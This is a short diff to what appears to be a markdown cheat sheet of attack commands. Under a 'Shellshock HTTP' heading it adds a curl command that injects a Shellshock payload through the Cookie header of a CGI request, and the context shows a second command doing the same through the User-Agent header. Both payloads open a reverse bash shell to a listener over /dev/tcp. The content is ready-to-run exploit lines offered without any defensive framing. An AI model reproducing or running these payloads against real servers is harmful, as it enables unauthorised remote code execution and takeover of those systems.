@@ -275,7 +275,10 @@
   ---
   
   # <kbd>Shellshock HTTP</kbd>
-
+   
+  ```cmd 
+  curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1' http://192.168.1.3/cgi-bin/test.sh
+  ```
   ```cmd
   curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
   
